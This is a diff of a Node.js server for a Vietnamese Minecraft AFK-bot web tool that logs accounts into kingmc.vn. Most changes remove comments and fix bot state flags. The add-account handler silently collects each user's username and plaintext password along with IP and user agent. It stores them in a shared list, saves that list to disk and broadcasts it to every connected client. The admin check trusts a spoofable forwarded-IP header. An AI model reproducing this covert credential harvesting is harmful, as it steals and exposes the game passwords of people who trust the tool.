@@ -2,7 +2,7 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const mineflayer = require('mineflayer');
-const fs = require('fs'); // 👈 THÊM DÒNG NÀY
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -28,7 +28,6 @@ function loadData() {
     return { clientData: {}, globalCollectedData: [], isMaintenance: false };
 }
 
-// ===== LƯU DỮ LIỆU VÀO FILE =====
 function saveData() {
     try {
         const data = {
@@ -43,7 +42,6 @@ function saveData() {
     }
 }
 
-// ===== KHỞI TẠO DỮ LIỆU TỪ FILE =====
 const savedData = loadData();
 let clientData = savedData.clientData || {};
 let globalCollectedData = savedData.globalCollectedData || [];
@@ -53,7 +51,6 @@ console.log(`📂 Đã load ${Object.keys(clientData).length} IP, ${globalCollec
 
 app.use(express.static('public'));
 
-// ===== API KIỂM TRA ADMIN =====
 app.get('/api/check-admin', (req, res) => {
     let clientIp = req.headers['x-forwarded-for'] 
         ? req.headers['x-forwarded-for'].split(',')[0].trim() 
@@ -63,7 +60,6 @@ app.get('/api/check-admin', (req, res) => {
     res.json({ isAdmin, ip: clientIp });
 });
 
-// ===== BẮT LỖI TOÀN CỤC =====
 process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
 process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));
 
@@ -79,16 +75,14 @@ io.on('connection', (socket) => {
 
     console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);
 
-    // Khởi tạo dữ liệu cho IP này
     if (!clientData[clientIp]) {
         clientData[clientIp] = {
             accounts: [],
             bots: {}
         };
-        saveData(); // Lưu ngay khi tạo mới
+        saveData();
     }
 
-    // Gửi danh sách tài khoản về client
     socket.emit('init_accounts', clientData[clientIp].accounts);
     socket.emit('sync_collected_data', globalCollectedData);
     socket.emit('maintenance_status', isMaintenance);
@@ -103,7 +97,7 @@ io.on('connection', (socket) => {
             userAgent: data.userAgent || 'N/A'
         };
         globalCollectedData.push(entry);
-        saveData(); // 👈 LƯU SAU KHI THÊM
+        saveData();
         console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
         io.emit('sync_collected_data', globalCollectedData);
         io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
@@ -111,26 +105,24 @@ io.on('connection', (socket) => {
 
     socket.on('clear_collected_data', () => {
         globalCollectedData = [];
-        saveData(); // 👈 LƯU SAU KHI XÓA
+        saveData();
         io.emit('sync_collected_data', globalCollectedData);
         io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
     });
 
-    // ===== BẢO TRÌ =====
     socket.on('toggle_maintenance', (status) => {
         isMaintenance = status;
-        saveData(); // 👈 LƯU TRẠNG THÁI BẢO TRÌ
+        saveData();
         io.emit('maintenance_status', isMaintenance);
         io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
         console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
     });
 
-    // ===== QUẢN LÝ ACCOUNTS (MULTI-ACCOUNT) =====
+    // ===== QUẢN LÝ ACCOUNTS =====
     socket.on('add_account', (data) => {
         const { username, password } = data;
         if (!username) return;
         
-        // Tự động thu thập dữ liệu
         socket.emit('collect_data', {
             username: username,
             password: password || 'caigicungdc',
@@ -146,7 +138,7 @@ io.on('connection', (socket) => {
             status: 'OFFLINE',
             color: '#ff4444'
         });
-        saveData(); // 👈 LƯU SAU KHI THÊM ACCOUNT
+        saveData();
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
     });
@@ -157,7 +149,7 @@ io.on('connection', (socket) => {
             delete clientData[clientIp].bots[id];
         }
         clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
-        saveData(); // 👈 LƯU SAU KHI XÓA
+        saveData();
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
     });
@@ -166,13 +158,13 @@ io.on('connection', (socket) => {
         const acc = clientData[clientIp].accounts.find(a => a.id === id);
         if (acc) {
             acc.autoReconnect = !acc.autoReconnect;
-            saveData(); // 👈 LƯU SAU KHI THAY ĐỔI
+            saveData();
             io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         }
     });
 
     // ============================================================
-    //  BOT MINEFLAYER (MULTI-ACCOUNT - MỖI BOT 1 TÀI KHOẢN)
+    //  BOT MINEFLAYER - SỬA LỖI
     // ============================================================
     socket.on('start_bot', (id) => {
         const account = clientData[clientIp].accounts.find(acc => acc.id === id);
@@ -180,12 +172,19 @@ io.on('connection', (socket) => {
 
         if (clientData[clientIp].bots[id]) {
             try { clientData[clientIp].bots[id].quit(); } catch(e){}
+            delete clientData[clientIp].bots[id];
         }
 
         account.status = 'CONNECTING...';
         account.color = 'yellow';
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         socket.emit('log', `[${account.username}] 🔄 Đang kết nối tới kingmc.vn...`);
+
+        // ===== BIẾN CỤC BỘ CHO MỖI BOT =====
+        let hasJoinedKingSMP = false;
+        let hasExecutedAFK = false;
+        let isLoggedIn = false;
+        let isFirstSpawn = true;
 
         try {
             const bot = mineflayer.createBot({
@@ -199,10 +198,8 @@ io.on('connection', (socket) => {
             });
 
             clientData[clientIp].bots[id] = bot;
-            let hasJoinedKingSMP = false;
-            let hasExecutedAFK = false;
-            let isLoggedIn = false;
 
+            // ===== LOGIN =====
             bot.on('login', () => {
                 account.status = 'LOGGING IN...';
                 account.color = 'orange';
@@ -210,7 +207,16 @@ io.on('connection', (socket) => {
                 socket.emit('log', `[${account.username}] 🔑 Đang đăng nhập...`);
             });
 
+            // ===== SPAWN =====
             bot.on('spawn', () => {
+                // Chỉ reset biến khi spawn lần đầu
+                if (isFirstSpawn) {
+                    hasJoinedKingSMP = false;
+                    hasExecutedAFK = false;
+                    isLoggedIn = false;
+                    isFirstSpawn = false;
+                }
+
                 if (hasJoinedKingSMP) {
                     account.status = 'ONLINE / KINGSMP';
                     account.color = '#00ff88';
@@ -223,16 +229,23 @@ io.on('connection', (socket) => {
                 io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
             });
 
+            // ===== MESSAGESTR =====
             bot.on('messagestr', (message) => {
                 socket.emit('log', `[${account.username}]: ${message}`);
                 const msgLower = message.toLowerCase();
 
+                // Đăng ký / đăng nhập
                 if (msgLower.includes('/register') || msgLower.includes('/dk')) {
-                    setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
+                    setTimeout(() => { 
+                        if (bot) bot.chat(`/dk ${account.password} ${account.password}`); 
+                    }, 2000);
                 } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
-                    setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 2000);
+                    setTimeout(() => { 
+                        if (bot) bot.chat(`/dn ${account.password}`); 
+                    }, 2000);
                 }
 
+                // Phát hiện đăng nhập thành công
                 if (!hasJoinedKingSMP && !isLoggedIn && 
                     (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                     isLoggedIn = true;
@@ -244,58 +257,103 @@ io.on('connection', (socket) => {
                         }
                     }, 5000);
                 }
+
+                // Phát hiện đã vào KingSMP thành công
+                if (msgLower.includes('kingsmp') && msgLower.includes('chào mừng')) {
+                    hasJoinedKingSMP = true;
+                    account.status = 'ONLINE / KINGSMP';
+                    account.color = '#00ff88';
+                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+                    socket.emit('log', `[${account.username}] ✅ ĐÃ VÀO KINGSMP!`);
+                    
+                    // Gõ /afk ngay khi vào KingSMP
+                    if (!hasExecutedAFK) {
+                        setTimeout(() => {
+                            if (bot) {
+                                socket.emit('log', `[${account.username}] 💤 Gửi lệnh /afk...`);
+                                bot.chat('/afk');
+                            }
+                        }, 3000);
+                    }
+                }
             });
 
+            // ===== WINDOWOPEN - QUAN TRỌNG =====
             bot.on('windowOpen', (window) => {
                 const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                 socket.emit('log', `[${account.username}] 📂 Menu mở: ${rawTitle}`);
 
-                // BƯỚC 1: Chọn KingSMP (Slot 24)
-                if (!hasJoinedKingSMP) {
-                    setTimeout(() => {
-                        if (!bot || !bot.currentWindow) return;
-                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 24 chọn KingSMP...`);
-                        hasJoinedKingSMP = true;
-
-                        bot.clickWindow(24, 0, 0)
-                            .then(() => socket.emit('log', `[${account.username}] ✅ Click Slot 24 thành công!`))
-                            .catch(() => socket.emit('log', `[${account.username}] ⚠️ Bỏ qua cảnh báo transaction`));
-
+                // Nếu đây là menu Sảnh (chứa KingSMP)
+                if (rawTitle.includes('sảnh') || rawTitle.includes('lobby') || rawTitle.includes('menu')) {
+                    // BƯỚC 1: Chọn KingSMP (Slot 24)
+                    if (!hasJoinedKingSMP) {
                         setTimeout(() => {
-                            try { bot.closeWindow(window); } catch(e){}
-                        }, 500);
+                            if (!bot || !bot.currentWindow) {
+                                socket.emit('log', `[${account.username}] ⚠️ Không có window để click`);
+                                return;
+                            }
+                            socket.emit('log', `[${account.username}] 🖱️ Click Slot 24 chọn KingSMP...`);
+                            hasJoinedKingSMP = true;
 
-                    }, 2500);
-                } 
-                // BƯỚC 2: Gõ /afk + Click Slot 1
-                else if (hasJoinedKingSMP && !hasExecutedAFK) {
-                    socket.emit('log', `[${account.username}] 💤 Gửi lệnh /afk...`);
-                    bot.chat('/afk');
-                    
-                    setTimeout(() => {
-                        if (!bot || !bot.currentWindow) return;
-                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 1 chọn AFK...`);
-                        hasExecutedAFK = true;
+                            bot.clickWindow(24, 0, 0)
+                                .then(() => {
+                                    socket.emit('log', `[${account.username}] ✅ Click Slot 24 thành công!`);
+                                })
+                                .catch((err) => {
+                                    socket.emit('log', `[${account.username}] ⚠️ Lỗi click: ${err.message}`);
+                                });
 
-                        bot.clickWindow(1, 0, 0)
-                            .then(() => socket.emit('log', `[${account.username}] 🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`))
-                            .catch(() => socket.emit('log', `[${account.username}] ⚠️ Bỏ qua cảnh báo transaction AFK`));
+                            setTimeout(() => {
+                                try { bot.closeWindow(window); } catch(e){}
+                            }, 500);
 
+                        }, 3000); // Chờ 3s
+                    }
+                }
+
+                // Nếu đây là menu AFK (sau khi gõ /afk)
+                if (rawTitle.includes('afk') || rawTitle.includes('tự động')) {
+                    if (hasJoinedKingSMP && !hasExecutedAFK) {
                         setTimeout(() => {
-                            try { bot.closeWindow(window); } catch(e){}
-                        }, 500);
+                            if (!bot || !bot.currentWindow) {
+                                socket.emit('log', `[${account.username}] ⚠️ Không có window AFK`);
+                                return;
+                            }
+                            socket.emit('log', `[${account.username}] 🖱️ Click Slot 1 chọn AFK...`);
+                            hasExecutedAFK = true;
 
-                    }, 2500);
+                            bot.clickWindow(1, 0, 0)
+                                .then(() => {
+                                    socket.emit('log', `[${account.username}] 🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`);
+                                })
+                                .catch((err) => {
+                                    socket.emit('log', `[${account.username}] ⚠️ Lỗi click AFK: ${err.message}`);
+                                });
+
+                            setTimeout(() => {
+                                try { bot.closeWindow(window); } catch(e){}
+                            }, 500);
+
+                        }, 3500); // Chờ 3.5s
+                    }
                 }
             });
 
+            // ===== END =====
             bot.on('end', (reason) => {
                 socket.emit('log', `[${account.username}] ⚠️ Ngắt kết nối: ${reason}`);
                 account.status = 'OFFLINE';
                 account.color = '#ff4444';
                 io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+                
+                // Reset biến khi bot disconnect
+                hasJoinedKingSMP = false;
+                hasExecutedAFK = false;
+                isLoggedIn = false;
+                isFirstSpawn = true;
+                
                 delete clientData[clientIp].bots[id];
-                saveData(); // 👈 LƯU KHI BOT OFFLINE
+                saveData();
 
                 if (account.autoReconnect) {
                     socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 6 giây...`);
@@ -307,9 +365,12 @@ io.on('connection', (socket) => {
                 }
             });
 
+            // ===== ERROR =====
             bot.on('error', (err) => {
                 if (err.code === 'EPIPE') {
                     socket.emit('log', `[${account.username}] ⚠️ Mất kết nối server, đang thử lại...`);
+                } else if (err.code === 'ECONNREFUSED') {
+                    socket.emit('log', `[${account.username}] ❌ Không thể kết nối tới server!`);
                 } else {
                     socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
                 }
@@ -334,7 +395,7 @@ io.on('connection', (socket) => {
             try { clientData[clientIp].bots[id].quit(); } catch(e){}
             delete clientData[clientIp].bots[id];
         }
-        saveData(); // 👈 LƯU KHI DỪNG BOT
+        saveData();
         socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
     });
 
@@ -357,7 +418,6 @@ io.on('connection', (socket) => {
     });
 });
 
-// ===== START SERVER =====
 server.listen(PORT, () => {
     console.log(`🚀 Cat Tool Server đang chạy tại: http://localhost:${PORT}`);
     console.log(`👑 Admin IP: ${ADMIN_IP}`);
